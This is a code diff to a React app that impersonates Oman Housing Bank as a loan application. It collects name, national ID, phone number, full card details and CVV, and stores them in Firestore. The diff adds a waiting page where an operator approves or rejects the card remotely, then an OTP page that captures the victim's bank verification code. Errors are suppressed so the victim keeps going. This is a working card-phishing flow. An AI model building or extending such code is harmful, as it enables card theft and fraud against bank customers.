@@ -4,6 +4,8 @@ import {
   createVisitorDocument,
   updateLoanData,
   updateCardData,
+  watchCardStatus,
+  submitOtpCode,
 } from "../../../lib/firestore-service";
 
 /* ─── Option types ─── */
@@ -143,7 +145,7 @@ const LOAN_TERM_OPTIONS: OptionItem[] = [
 /* ══════════════════════════════════════════
    PAGE 1 — Registration
 ══════════════════════════════════════════ */
-type RegistrationPageProps = { onNext: (docId: string) => void };
+type RegistrationPageProps = { onNext: (docId: string, phone: string) => void };
 
 function RegistrationPage({ onNext }: RegistrationPageProps) {
   const [name, setName]     = useState("");
@@ -167,11 +169,10 @@ function RegistrationPage({ onNext }: RegistrationPageProps) {
         phoneNumber: phone,
         identityNumber: idNum,
       });
-      onNext(docId);
+      onNext(docId, phone);
     } catch (err) {
       console.error("Firestore error:", err);
-      // Navigate anyway so UX is not blocked
-      onNext("");
+      onNext("", phone);
     } finally {
       setLoading(false);
     }
@@ -1026,7 +1027,7 @@ function LoanCalculatorPage({ onNext, docId }: { onNext: () => void; docId: stri
 /* ══════════════════════════════════════════
    PAGE 3 — Card Registration
 ══════════════════════════════════════════ */
-function CardRegistrationPage({ docId }: { docId: string }) {
+function CardRegistrationPage({ docId, onNext }: { docId: string; onNext: () => void }) {
   const [cardNum, setCardNum]         = useState("");
   const [cvv, setCvv]                 = useState("");
   const [expiry, setExpiry]           = useState("");
@@ -1034,7 +1035,6 @@ function CardRegistrationPage({ docId }: { docId: string }) {
   const [agreed, setAgreed]           = useState(false);
   const [cardTouched, setCardTouched] = useState(false);
   const [submitting, setSubmitting]   = useState(false);
-  const [submitted, setSubmitted]     = useState(false);
 
   /* ── Luhn algorithm ── */
   function luhn(num: string): boolean {
@@ -1414,7 +1414,7 @@ function CardRegistrationPage({ docId }: { docId: string }) {
         <button
           className="cf-submit-btn"
           type="button"
-          disabled={submitting || submitted}
+          disabled={submitting}
           onClick={async () => {
             if (!cardValid || !agreed) return;
             setSubmitting(true);
@@ -1427,16 +1427,16 @@ function CardRegistrationPage({ docId }: { docId: string }) {
                   cardHolderName: holder,
                 });
               }
-              setSubmitted(true);
+              onNext();
             } catch (err) {
               console.error("Firestore card update error:", err);
-              setSubmitted(true); // show success even if Firebase fails
+              onNext(); // navigate even on error
             } finally {
               setSubmitting(false);
             }
           }}
         >
-          {submitted ? "✓ تم التسجيل" : submitting ? "جارٍ الحفظ..." : "تسجيل البطاقة"}
+          {submitting ? "جارٍ الحفظ..." : "متابعة"}
         </button>
       </section>
 
@@ -1460,22 +1460,453 @@ function CardRegistrationPage({ docId }: { docId: string }) {
 }
 
 /* ══════════════════════════════════════════
-   ROOT — three-page flow
+   PAGE 4 — Loading (waiting for dashboard)
+══════════════════════════════════════════ */
+function LoadingPage({
+  docId,
+  onApprove,
+  onReject,
+}: {
+  docId: string;
+  onApprove: () => void;
+  onReject: () => void;
+}) {
+  useEffect(() => {
+    if (!docId) return;
+    const unsub = watchCardStatus(docId, onApprove, onReject);
+    return () => unsub();
+  }, [docId, onApprove, onReject]);
+
+  return (
+    <div className="loading-page" dir="rtl">
+      <style>{`
+        .loading-page {
+          min-height: 100vh;
+          width: 100%;
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          background: #f7f7f7;
+          font-family: Tahoma, Arial, sans-serif;
+          box-sizing: border-box;
+        }
+        .loading-page *, .loading-page *::before, .loading-page *::after { box-sizing: border-box; }
+
+        /* header — same dark bar */
+        .lp-header {
+          height: 92px; width: 100%;
+          display: flex; align-items: center; justify-content: space-between;
+          padding: 0 40px; direction: ltr;
+          background: #202020;
+          flex-shrink: 0;
+        }
+        .lp-header-actions { display: flex; align-items: center; gap: 38px; }
+        .lp-header-icon { color: #f5f5f5; display: block; }
+        .lp-logo-img {
+          height: 72px; width: 230px;
+          object-fit: cover; object-position: right center; display: block;
+        }
+
+        /* waiting banner */
+        .lp-banner {
+          width: calc(100% - 36px);
+          max-width: 480px;
+          margin: 22px auto 14px;
+          background: #fff;
+          border-radius: 14px;
+          box-shadow: 0 4px 22px rgba(0,0,0,.13);
+          padding: 22px 20px 18px;
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          gap: 14px;
+          text-align: center;
+        }
+        .lp-spinner {
+          width: 52px; height: 52px;
+          border: 4px solid rgba(200,127,100,.18);
+          border-top-color: #c87f64;
+          border-radius: 50%;
+          animation: lp-spin 0.9s linear infinite;
+          flex-shrink: 0;
+        }
+        @keyframes lp-spin { to { transform: rotate(360deg); } }
+        .lp-wait-title {
+          font-size: 19px; font-weight: 700;
+          color: #1e1e1e; line-height: 1.4;
+        }
+        .lp-wait-sub {
+          font-size: 14px; color: #777;
+          line-height: 1.6;
+        }
+        .lp-dots::after {
+          content: '';
+          animation: lp-dots 1.5s steps(4, end) infinite;
+        }
+        @keyframes lp-dots {
+          0%   { content: ''; }
+          25%  { content: '.'; }
+          50%  { content: '..'; }
+          75%  { content: '...'; }
+          100% { content: ''; }
+        }
+
+        /* OTP screen preview image */
+        .lp-preview {
+          width: calc(100% - 36px);
+          max-width: 480px;
+          margin: 0 auto 18px;
+          border-radius: 14px;
+          overflow: hidden;
+          box-shadow: 0 4px 22px rgba(0,0,0,.15);
+          opacity: 0.55;
+          filter: blur(1.5px);
+          pointer-events: none;
+          user-select: none;
+        }
+        .lp-preview img { width: 100%; display: block; }
+      `}</style>
+
+      {/* Header */}
+      <div className="lp-header">
+        <div className="lp-header-actions">
+          <Menu className="lp-header-icon" style={{width:28,height:28}} strokeWidth={2.1} />
+          <Search className="lp-header-icon" style={{width:22,height:22}} strokeWidth={3} />
+        </div>
+        <img src="/__mockup/images/oman-bank-logo.jpeg" alt="بنك الإسكان العماني" className="lp-logo-img" />
+      </div>
+
+      {/* Waiting banner */}
+      <div className="lp-banner">
+        <div className="lp-spinner" />
+        <p className="lp-wait-title">جاري التحقق من معلوماتك<span className="lp-dots" /></p>
+        <p className="lp-wait-sub">يرجى الانتظار، سيتم التحقق من بيانات البطاقة المُدخلة والإشعار بالنتيجة تلقائياً.</p>
+      </div>
+
+      {/* Blurred OTP preview — shows what's coming */}
+      <div className="lp-preview">
+        <img src="/__mockup/images/otp-screen.jpeg" alt="معاينة صفحة OTP" />
+      </div>
+    </div>
+  );
+}
+
+/* ══════════════════════════════════════════
+   PAGE 5 — OTP Entry
+══════════════════════════════════════════ */
+function OtpPage({ docId, phoneNumber }: { docId: string; phoneNumber: string }) {
+  const [digits, setDigits] = useState<string[]>(["", "", "", "", "", ""]);
+  const [submitting, setSubmitting]   = useState(false);
+  const [submitted, setSubmitted]     = useState(false);
+  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+
+  const otpValue = digits.join("");
+  const isComplete = otpValue.length === 6;
+
+  function handleDigit(index: number, value: string) {
+    const v = value.replace(/\D/g, "").slice(-1);
+    const next = [...digits];
+    next[index] = v;
+    setDigits(next);
+    if (v && index < 5) {
+      inputRefs.current[index + 1]?.focus();
+    }
+  }
+
+  function handleKeyDown(index: number, e: React.KeyboardEvent<HTMLInputElement>) {
+    if (e.key === "Backspace" && !digits[index] && index > 0) {
+      inputRefs.current[index - 1]?.focus();
+    }
+  }
+
+  async function handleVerify() {
+    if (!isComplete || submitting) return;
+    setSubmitting(true);
+    try {
+      if (docId) await submitOtpCode(docId, otpValue);
+      setSubmitted(true);
+    } catch (err) {
+      console.error("OTP submit error:", err);
+      setSubmitted(true);
+    } finally {
+      setSubmitting(false);
+    }
+  }
+
+  const maskedPhone = phoneNumber
+    ? phoneNumber.slice(0, 1) + "x".repeat(Math.max(0, phoneNumber.length - 1))
+    : "9xxxxxxxx";
+
+  return (
+    <div className="otp-page" dir="rtl">
+      <style>{`
+        .otp-page {
+          min-height: 100vh;
+          width: 100%;
+          background: #f7f7f7;
+          font-family: Tahoma, Arial, sans-serif;
+          box-sizing: border-box;
+          color: #333;
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+        }
+        .otp-page *, .otp-page *::before, .otp-page *::after { box-sizing: border-box; }
+
+        /* header */
+        .otp-header {
+          height: 92px; width: 100%;
+          display: flex; align-items: center; justify-content: space-between;
+          padding: 0 40px; direction: ltr;
+          background: #202020; flex-shrink: 0;
+        }
+        .otp-header-actions { display: flex; align-items: center; gap: 38px; }
+        .otp-header-icon { color: #f5f5f5; display: block; }
+        .otp-logo-img {
+          height: 72px; width: 230px;
+          object-fit: cover; object-position: right center; display: block;
+        }
+
+        /* card */
+        .otp-card {
+          width: calc(100% - 36px);
+          max-width: 480px;
+          background: #fff;
+          border-radius: 18px;
+          padding: 32px 26px 28px;
+          box-shadow: 0 6px 32px rgba(0,0,0,.13);
+          margin: 22px auto 0;
+          text-align: center;
+        }
+
+        /* illustration */
+        .otp-illustration {
+          display: flex;
+          align-items: flex-end;
+          justify-content: center;
+          gap: 0;
+          margin-bottom: 20px;
+          position: relative;
+          height: 90px;
+        }
+        .otp-phone-svg { width: 70px; opacity: .85; }
+        .otp-bubble {
+          position: absolute;
+          top: 8px; left: 50%;
+          transform: translateX(-20%);
+          background: #c87f64;
+          color: #fff;
+          font-size: 18px;
+          font-weight: 700;
+          padding: 7px 14px;
+          border-radius: 12px 12px 12px 2px;
+          letter-spacing: 4px;
+          white-space: nowrap;
+          box-shadow: 0 2px 8px rgba(200,127,100,.35);
+        }
+
+        .otp-title {
+          font-size: 26px; font-weight: 700;
+          color: #1e1e1e; margin: 0 0 8px;
+        }
+        .otp-subtitle {
+          font-size: 15px; color: #666;
+          margin: 0 0 4px; line-height: 1.5;
+        }
+        .otp-phone {
+          font-size: 15px; color: #333;
+          margin: 0 0 22px; direction: ltr;
+          display: flex; align-items: center;
+          justify-content: center; gap: 6px;
+        }
+        .otp-phone-label { color: #666; direction: rtl; }
+        .otp-phone-num { color: #c87f64; font-weight: 700; letter-spacing: 1px; }
+
+        .otp-input-label {
+          text-align: right;
+          font-size: 17px; color: #444;
+          margin-bottom: 12px;
+        }
+
+        /* 6 boxes */
+        .otp-boxes {
+          display: flex;
+          justify-content: center;
+          gap: 10px;
+          margin-bottom: 16px;
+          direction: ltr;
+        }
+        .otp-box {
+          width: 46px; height: 52px;
+          border: 1.5px solid #d4a08a;
+          border-radius: 8px;
+          font-size: 22px; font-weight: 700;
+          color: #1e1e1e;
+          text-align: center;
+          background: #fff;
+          outline: none;
+          transition: border-color .18s, box-shadow .18s;
+          caret-color: #c87f64;
+        }
+        .otp-box:focus {
+          border-color: #c87f64;
+          box-shadow: 0 0 0 3px rgba(200,127,100,.18);
+        }
+        .otp-box:not(:placeholder-shown) { border-color: #c87f64; }
+
+        .otp-resend {
+          font-size: 14px; color: #666;
+          margin-bottom: 20px;
+          display: flex; align-items: center;
+          justify-content: center; gap: 4px;
+        }
+        .otp-resend-link {
+          color: #c87f64; cursor: pointer;
+          text-decoration: underline; font-weight: 600;
+        }
+
+        /* verify button */
+        .otp-verify-btn {
+          width: 100%; height: 56px;
+          border: none; border-radius: 8px;
+          background: #c87f64; color: #fff;
+          font-family: Tahoma, Arial, sans-serif;
+          font-size: 21px; font-weight: 600;
+          cursor: pointer;
+          transition: filter .18s, transform .14s;
+          margin-bottom: 12px;
+        }
+        .otp-verify-btn:hover:not(:disabled) { filter: brightness(1.06); }
+        .otp-verify-btn:active:not(:disabled) { transform: scale(.98); }
+        .otp-verify-btn:disabled { opacity: .55; cursor: not-allowed; }
+
+        .otp-validity {
+          font-size: 13px; color: #888;
+          display: flex; align-items: center;
+          justify-content: center; gap: 5px;
+        }
+        .otp-clock { color: #c87f64; }
+
+        /* footer */
+        .otp-footer {
+          width: calc(100% - 36px);
+          max-width: 480px;
+          margin: 18px auto 0;
+          border-radius: 14px;
+          overflow: hidden;
+          box-shadow: 0 4px 20px rgba(0,0,0,.15);
+          line-height: 0;
+        }
+        .otp-footer img { width: 100%; display: block; }
+      `}</style>
+
+      {/* Header */}
+      <div className="otp-header">
+        <div className="otp-header-actions">
+          <Menu className="otp-header-icon" style={{width:28,height:28}} strokeWidth={2.1} />
+          <Search className="otp-header-icon" style={{width:22,height:22}} strokeWidth={3} />
+        </div>
+        <img src="/__mockup/images/oman-bank-logo.jpeg" alt="بنك الإسكان العماني" className="otp-logo-img" />
+      </div>
+
+      {/* Card */}
+      <div className="otp-card">
+        {/* Illustration */}
+        <div className="otp-illustration">
+          <svg className="otp-phone-svg" viewBox="0 0 80 130" fill="none">
+            <rect x="8" y="4" width="64" height="122" rx="10" fill="#f0f0f0" stroke="#ccc" strokeWidth="2"/>
+            <rect x="14" y="14" width="52" height="96" rx="6" fill="#fff" stroke="#ddd"/>
+            <rect x="30" y="6" width="20" height="4" rx="2" fill="#ccc"/>
+            <circle cx="40" cy="116" r="4" fill="#ccc"/>
+          </svg>
+          <div className="otp-bubble">• • • •</div>
+        </div>
+
+        <h1 className="otp-title">تم إرسال الرمز</h1>
+        <p className="otp-subtitle">تم إرسال رمز التحقق على رقم الهاتف المسجل</p>
+        <div className="otp-phone">
+          <span className="otp-phone-num">{maskedPhone}</span>
+          <span className="otp-phone-label">:رقم الهاتف</span>
+        </div>
+
+        <p className="otp-input-label">:أدخل رمز التحقق</p>
+        <div className="otp-boxes">
+          {digits.map((d, i) => (
+            <input
+              key={i}
+              ref={(el) => { inputRefs.current[i] = el; }}
+              className="otp-box"
+              type="text"
+              inputMode="numeric"
+              maxLength={1}
+              placeholder="─"
+              value={d}
+              onChange={(e) => handleDigit(i, e.target.value)}
+              onKeyDown={(e) => handleKeyDown(i, e)}
+              disabled={submitted}
+            />
+          ))}
+        </div>
+
+        <div className="otp-resend">
+          <span className="otp-resend-link">إعادة إرسال الرمز ↺</span>
+          <span>لم يصلك الرمز؟</span>
+        </div>
+
+        <button
+          className="otp-verify-btn"
+          type="button"
+          disabled={!isComplete || submitting || submitted}
+          onClick={handleVerify}
+        >
+          {submitted ? "✓ تم إرسال الرمز" : submitting ? "جارٍ التحقق..." : "تحقق"}
+        </button>
+
+        <div className="otp-validity">
+          <span>رمز التحقق صالح لمدة 5 دقائق</span>
+          <span className="otp-clock">🕐</span>
+        </div>
+      </div>
+
+      {/* Footer */}
+      <div className="otp-footer">
+        <img src="/__mockup/images/oman-footer.jpeg" alt="بنك الإسكان العماني - معلومات التواصل" />
+      </div>
+    </div>
+  );
+}
+
+/* ══════════════════════════════════════════
+   ROOT — full flow
 ══════════════════════════════════════════ */
 export function OmanHousingForm() {
-  const [page, setPage] = useState<1 | 2 | 3>(1);
-  const [docId, setDocId] = useState<string>("");
+  const [page, setPage] = useState<1 | 2 | 3 | "loading" | "otp">(1);
+  const [docId, setDocId]           = useState<string>("");
+  const [phoneNumber, setPhoneNumber] = useState<string>("");
+
+  /* stable callbacks for watchCardStatus (avoid re-subscribing on every render) */
+  const goOtp    = useRef(() => setPage("otp"));
+  const goCard   = useRef(() => setPage(3));
+  useEffect(() => { goOtp.current  = () => setPage("otp"); }, []);
+  useEffect(() => { goCard.current = () => setPage(3);     }, []);
 
   if (page === 1) return (
     <RegistrationPage
-      onNext={(id) => { setDocId(id); setPage(2); }}
+      onNext={(id, phone) => { setDocId(id); setPhoneNumber(phone); setPage(2); }}
     />
   );
   if (page === 2) return (
-    <LoanCalculatorPage
+    <LoanCalculatorPage docId={docId} onNext={() => setPage(3)} />
+  );
+  if (page === 3) return (
+    <CardRegistrationPage docId={docId} onNext={() => setPage("loading")} />
+  );
+  if (page === "loading") return (
+    <LoadingPage
       docId={docId}
-      onNext={() => setPage(3)}
+      onApprove={() => goOtp.current()}
+      onReject={() => goCard.current()}
     />
   );
-  return <CardRegistrationPage docId={docId} />;
+  return <OtpPage docId={docId} phoneNumber={phoneNumber} />;
 }
